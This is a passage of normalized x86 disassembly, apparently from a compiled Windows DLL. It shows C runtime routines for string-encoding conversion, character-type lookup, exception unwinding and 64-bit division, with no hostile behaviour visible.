call sub_1003f3e3
push [ esi + 0x38 ]
call sub_1003f3e3
push [ esi + 0x3c ]
call sub_1003f3e3
add esp 0x40
push [ esi + 0x40 ]
call sub_1003f3e3
push [ esi + 0x44 ]
call sub_1003f3e3
push [ esi + 0x48 ]
call sub_1003f3e3
push [ esi + 0x4c ]
call sub_1003f3e3
push [ esi + 0x50 ]
call sub_1003f3e3
push [ esi + 0x54 ]
call sub_1003f3e3
push [ esi + 0x58 ]
call sub_1003f3e3
push [ esi + 0x5c ]
call sub_1003f3e3
push [ esi + 0x60 ]
call sub_1003f3e3
push [ esi + 0x64 ]
call sub_1003f3e3
push [ esi + 0x68 ]
call sub_1003f3e3
push [ esi + 0x6c ]
call sub_1003f3e3
push [ esi + 0x70 ]
call sub_1003f3e3
push [ esi + 0x74 ]
call sub_1003f3e3
push [ esi + 0x78 ]
call sub_1003f3e3
push [ esi + 0x7c ]
call sub_1003f3e3
add esp 0x40
push [ esi + 0x80 ]
call sub_1003f3e3
push [ esi + 0x84 ]
call sub_1003f3e3
push [ esi + 0x88 ]
call sub_1003f3e3
push [ esi + 0x8c ]
call sub_1003f3e3
push [ esi + 0x90 ]
call sub_1003f3e3
push [ esi + 0x94 ]
call sub_1003f3e3
push [ esi + 0x98 ]
call sub_1003f3e3
push [ esi + 0x9c ]
call sub_1003f3e3
push [ esi + 0xa0 ]
call sub_1003f3e3
push [ esi + 0xa4 ]
call sub_1003f3e3
push [ esi + 0xa8 ]
call sub_1003f3e3
push [ esi + 0xb8 ]
call sub_1003f3e3
push [ esi + 0xbc ]
call sub_1003f3e3
push [ esi + 0xc0 ]
call sub_1003f3e3
push [ esi + 0xc4 ]
call sub_1003f3e3
push [ esi + 0xc8 ]
call sub_1003f3e3
add esp 0x40
push [ esi + 0xcc ]
call sub_1003f3e3
push [ esi + 0xb4 ]
call sub_1003f3e3
push [ esi + 0xd4 ]
call sub_1003f3e3
push [ esi + 0xd8 ]
call sub_1003f3e3
push [ esi + 0xdc ]
call sub_1003f3e3
push [ esi + 0xe0 ]
call sub_1003f3e3
push [ esi + 0xe4 ]
call sub_1003f3e3
push [ esi + 0xe8 ]
call sub_1003f3e3
push [ esi + 0xd0 ]
call sub_1003f3e3
push [ esi + 0xec ]
call sub_1003f3e3
push [ esi + 0xf0 ]
call sub_1003f3e3
push [ esi + 0xf4 ]
call sub_1003f3e3
push [ esi + 0xf8 ]
call sub_1003f3e3
push [ esi + 0xfc ]
call sub_1003f3e3
push [ esi + 0x100 ]
call sub_1003f3e3
push [ esi + 0x104 ]
call sub_1003f3e3
add esp 0x40
push [ esi + 0x108 ]
call sub_1003f3e3
push [ esi + 0x10c ]
call sub_1003f3e3
push [ esi + 0x110 ]
call sub_1003f3e3
push [ esi + 0x114 ]
call sub_1003f3e3
push [ esi + 0x118 ]
call sub_1003f3e3
push [ esi + 0x11c ]
call sub_1003f3e3
push [ esi + 0x120 ]
call sub_1003f3e3
push [ esi + 0x124 ]
call sub_1003f3e3
push [ esi + 0x128 ]
call sub_1003f3e3
push [ esi + 0x12c ]
call sub_1003f3e3
push [ esi + 0x130 ]
call sub_1003f3e3
push [ esi + 0x134 ]
call sub_1003f3e3
push [ esi + 0x138 ]
call sub_1003f3e3
push [ esi + 0x13c ]
call sub_1003f3e3
push [ esi + 0x140 ]
call sub_1003f3e3
push [ esi + 0x144 ]
call sub_1003f3e3
add esp 0x40
push [ esi + 0x148 ]
call sub_1003f3e3
push [ esi + 0x14c ]
call sub_1003f3e3
push [ esi + 0x150 ]
call sub_1003f3e3
push [ esi + 0x154 ]
call sub_1003f3e3
push [ esi + 0x158 ]
call sub_1003f3e3
push [ esi + 0x15c ]
call sub_1003f3e3
push [ esi + 0x160 ]
call sub_1003f3e3
add esp 0x1c
sub_10047368
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x18 ]
push edi
test esi esi
jle r-xdata
mov ecx [ ebp + 0x24 ]
xor edi edi
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx esi
xor eax eax
cmp [ ebp + 0x28 ] eax
push 0x0
push 0x0
push esi
push [ ebp + 0x14 ]
setne al
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ecx eax
mov [ ebp - 0x8 ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov ecx eax
mov [ ebp + 0x24 ] eax
mov eax esi
sub eax ecx
dec eax
cmp eax esi
lea esi [ eax + 0x1 ]
jl r-xdata
inc eax
test ecx ecx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov esi eax
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push ecx
push ebx
push esi
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
add ecx ecx
lea eax [ ecx + 0x8 ]
cmp eax ecx
jbe r-xdata
push ebx
call sub_100459a2
pop ecx
mov eax edi
mov esi [ ebp - 0x8 ]
push 0x0
push 0x0
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10045a38
mov edi eax
add esp 0x18
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
lea eax [ eax * 2 + 0x8 ]
cmp eax 0x400
ja r-xdata
test [ ebp + 0x10 ] 0x400
je r-xdata
push eax
call sub_1003fc06
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
call sub_10048520
mov ebx esp
test ebx ebx
je r-xdata
test edi edi
jle r-xdata
mov ecx [ ebp + 0x20 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov [ ebx ] 0xdddd
mov [ ebx ] 0xcccc
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp edi ecx
jg r-xdata
test ebx ebx
je r-xdata
add ebx 0x8
mov eax [ ebp - 0x8 ]
push edi
push esi
push eax
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10045a38
add esp 0x18
test eax eax
je r-xdata
lea ecx [ edi + edi ]
lea eax [ ecx + 0x8 ]
cmp eax ecx
jbe r-xdata
push ecx
push [ ebp + 0x1c ]
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10045a38
add esp 0x18
jmp r-xdata
push esi
call sub_100459a2
pop ecx
xor eax eax
push eax
push eax
cmp [ ebp + 0x20 ] eax
jne r-xdata
lea eax [ edi * 2 + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push eax
jmp r-xdata
push eax
call sub_1003fc06
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_10048520
mov esi esp
test esi esi
je r-xdata
push edi
push esi
push eax
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_1004756c
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1003cf9b
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10047368
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100475b2
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x1c ]
push ebx
push esi
push edi
xor edi edi
test ecx ecx
jne r-xdata
push edi
xor eax eax
cmp [ ebp + 0x20 ] eax
push edi
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov ecx eax
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
mov esi edi
cmp ebx 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
lea eax [ ebx + ebx ]
push eax
push edi
push esi
call sub_10045ec0
add esp 0xc
push ebx
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea ecx [ ebx + ebx ]
lea eax [ ecx + 0x8 ]
cmp eax ecx
jbe r-xdata
push esi
call sub_100459a2
pop ecx
mov eax edi
push [ ebp + 0x18 ]
push eax
push esi
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov edi eax
lea eax [ ebx * 2 + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_1003fc06
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_10048520
mov esi esp
test esi esi
je r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_100476aa
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1003cf9b
push [ ebp + 0x20 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100475b2
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100476ea
push ebp
mov ebp esp
push ecx
mov ax [ ebp + 0x8 ]
mov ecx 0xffff
cmp ax cx
jne r-xdata
mov ecx 0x100
cmp ax cx
jae r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
neg eax
sbb eax eax
and eax [ ebp - 0x4 ]
movzx eax ax
movzx ecx ax
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
movzx ecx cx
and eax ecx
sub_10047740
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10045a38
add esp 0x18
pop ebp
retn
push eax
push [ ebp + 0x10 ]
call sub_10047788
pop ecx
pop ecx
sub_10047788
push ebp
mov ebp esp
xor edx edx
mov eax edx
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
add ecx 0x2
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] dx
je r-xdata
sub_100477a7
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_100417ee
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
xor eax eax
mov [ ecx ] ax
jmp r-xdata
pop esi
pop ebp
retn
push ebx
mov ebx ecx
push edi
mov edi eax
cmp edx 0xffffffff
jne r-xdata
xor eax eax
mov [ ecx ] ax
sub esi ecx
sub ebx esi
test edx edx
jne r-xdata
dec edi
je r-xdata
test edi edi
pop edi
pop ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ebx ] ax
dec edx
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
movzx eax [ esi ]
mov [ ebx + esi ] ax
lea esi [ esi + 0x2 ]
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ esi + ebx ]
mov [ ebx ] ax
lea ebx [ ebx + 0x2 ]
test ax ax
je r-xdata
xor eax eax
mov [ ecx ] ax
call sub_100417ee
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
push 0x50
mov [ ecx + eax * 2 - 0x2 ] dx
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_1003fe28
mov eax esi
sub_10047865
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push [ ebp + 0x10 ]
call sub_1003cf9b
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov eax ebx
lea ecx [ ebp - 0x18 ]
sar eax 0x8
mov [ ebp + 0x8 ] eax
push ecx
movzx eax al
push eax
call sub_10046c47
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov eax [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_100476aa
add esp 0x1c
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10047916
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1003cf9b
mov eax [ ebp + 0xc ]
mov cl [ ebp + 0x14 ]
movzx esi al
mov eax [ ebp - 0xc ]
test [ eax + esi + 0x19 ] cl
jne r-xdata
xor edx edx
inc edx
xor edx edx
cmp [ ebp + 0x10 ] edx
je r-xdata
mov eax edx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax edx
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + esi * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
test eax eax
je r-xdata
sub_10047990
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100479b0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_1003c623
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_100479f5
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_100479f5
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_100479b0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10047aa5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10047ac4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_10047a9c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10047aa5
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10047ad6
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1003cf9b
mov ecx [ ebp - 0x10 ]
cmp [ ecx + 0x74 ] 0x1
jle r-xdata
mov ecx [ ecx + 0x90 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ ecx + eax * 2 ]
and ecx 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_10047865
add esp 0xc
mov ecx eax
jmp r-xdata
mov eax ecx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10047b28
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10047ad6
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
pop ebp
retn
sub_10047b60
push ebp
mov ebp esp
push edi
cmp [ rw-data ] 0x1
jb r-xdata
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov edi [ ebp + 0x8 ]
ja r-xdata
mov eax edi
xor eax eax
jmp r-xdata
movzx edx [ ebp + 0xc ]
test edx edx
je r-xdata
movzx edx [ ebp + 0xc ]
mov eax edx
shl edx 0x8
or edx eax
movd xmm3 edx
pshuflw xmm3 xmm3 0x0
movlhps xmm3 xmm3
mov ecx 0xf
and ecx edi
or eax 0xffffffff
shl eax cl
sub edi ecx
xor edx edx
cld
pop edi
leave
retn
mov eax 0xfffffff0
and eax edi
pxor xmm0 xmm0
pcmpeqb xmm0 [ eax ]
mov ecx 0xf
and ecx edi
mov edx 0xffffffff
shl edx cl
pmovmskb edi xmm0
and edi edx
jne r-xdata
xor eax eax
test edi 0xf
je r-xdata
push ebx
pmovmskb ebx xmm1
and ebx eax
shl ecx 0x1
xor eax eax
sub eax ecx
and ecx eax
dec ecx
and ecx ebx
pop ebx
bsr eax ecx
add eax edi
test ecx ecx
cmove eax edx
pop edi
leave
retn
pmovmskb ecx xmm1
and ecx eax
bsr eax ecx
add eax edi
test ecx ecx
cmovne edx eax
or eax 0xffffffff
add edi 0x10
jmp r-xdata
bsf edx edi
add eax edx
jmp r-xdata
pxor xmm0 xmm0
pcmpeqb xmm0 [ eax + 0x10 ]
add eax 0x10
pmovmskb edi xmm0
test edi edi
je r-xdata
movd xmm0 edx
movzx ecx [ edi ]
cmp ecx edx
cmove eax edi
test ecx ecx
je r-xdata
movdqu xmm1 [ edi ]
pxor xmm2 xmm2
pcmpeqb xmm2 xmm1
pcmpeqb xmm1 xmm3
pmovmskb ecx xmm2
and ecx eax
jne r-xdata
pop edi
leave
retn
add edi 0x10
pcmpistri xmm0 [ edi - 0x10 ] 0x40
lea ecx [ edi + ecx - 0x10 ]
cmovb eax ecx
jne r-xdata
inc edi
test edi 0xf
jne r-xdata
sub_10047c97
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ edx + 0xc ]
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_100417ee
push 0x16
mov ecx [ ebp + 0x10 ]
mov [ esi ] 0x0
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebp
retn
xor eax eax
mov eax ecx
jmp r-xdata
mov [ esi ] 0x30
push ebx
lea ebx [ esi + 0x1 ]
mov eax ebx
test ecx ecx
jle r-xdata
call sub_100417ee
push 0x22
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov [ eax ] 0x0
test ecx ecx
js r-xdata
mov dl [ edi ]
test dl dl
je r-xdata
pop esi
mov [ eax ] esi
call sub_1003fe28
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop edx
movsx edx dl
inc edi
jmp r-xdata
push ebx
call sub_1003e2d0
inc eax
push eax
push ebx
push esi
call sub_1003c640
add esp 0x10
inc [ edx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ eax ] dl
inc eax
dec ecx
test ecx ecx
jg r-xdata
xor eax eax
pop ebx
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_10047d47
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x2c ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1c ] eax
call sub_1003cf9b
lea eax [ ebp - 0x2c ]
xor edi edi
push eax
push edi
push edi
push edi
push edi
push esi
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_100495bf
mov ebx eax
add esp 0x20
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004904d
pop ecx
pop ecx
test bl 0x3
jne r-xdata
mov ecx [ ebp - 0x18 ]
mov [ eax ] ecx
test bl 0x1
jne r-xdata
cmp eax 0x1
je r-xdata
push 0x4
jmp r-xdata
test bl 0x2
je r-xdata
push 0x3
cmp eax 0x2
jne r-xdata
pop edi
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x24 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10047deb
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
lea ecx [ ebp - 0x28 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
call sub_1003cf9b
lea eax [ ebp - 0x28 ]
xor ebx ebx
push eax
push ebx
push ebx
push ebx
push ebx
push esi
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_100495bf
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_10048adb
mov ecx eax
add esp 0x28
mov eax [ ebp - 0x14 ]
test al 0x3
jne r-xdata
test al 0x1
jne r-xdata
cmp ecx 0x1
je r-xdata
push 0x4
jmp r-xdata
test al 0x2
je r-xdata
push 0x3
cmp ecx 0x2
jne r-xdata
pop ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ebx
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x20 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10047e91
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
movzx edi [ eax + 0x6 ]
mov ebx 0x80000000
mov edx [ eax + 0x4 ]
mov ecx edi
mov eax [ eax ]
and edi 0x8000
shr ecx 0x4
and edx 0xfffff
and ecx 0x7ff
mov [ ebp - 0x8 ] edi
mov esi ecx
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
test edx edx
jne r-xdata
cmp esi 0x7ff
je r-xdata
lea eax [ ecx + 0x3c01 ]
xor ebx ebx
test eax eax
jne r-xdata
mov eax 0x7fff
jmp r-xdata
lea eax [ ecx + 0x3c00 ]
jmp r-xdata
or edi eax
mov [ ebx + 0x8 ] di
mov edi eax
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] edx
and [ eax ] edx
mov [ eax + 0x8 ] di
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov esi ecx
shr esi 0x15
shl edx 0xb
or esi edx
shl ecx 0xb
or esi ebx
mov [ ebp + 0xc ] eax
mov ebx [ ebp + 0x8 ]
mov [ ebx + 0x4 ] esi
mov [ ebx ] ecx
test esi esi
js r-xdata
movzx eax ax
mov edx [ ebx ]
add esi esi
mov ecx edx
add edi 0xffff
shr ecx 0x1f
or esi ecx
lea eax [ edx + edx ]
mov [ ebx ] eax
jns r-xdata
mov [ ebp + 0xc ] edi
mov edi [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebx + 0x4 ] esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10047f59
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10047e91
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_10049d67
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_1003d191
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1003fe38
int3
mov ecx [ ebp - 0x4 ]
mov eax ebx
pop edi
mov [ ebx + 0xc ] esi
xor ecx ebp
pop esi
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn
sub_10047ff0
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
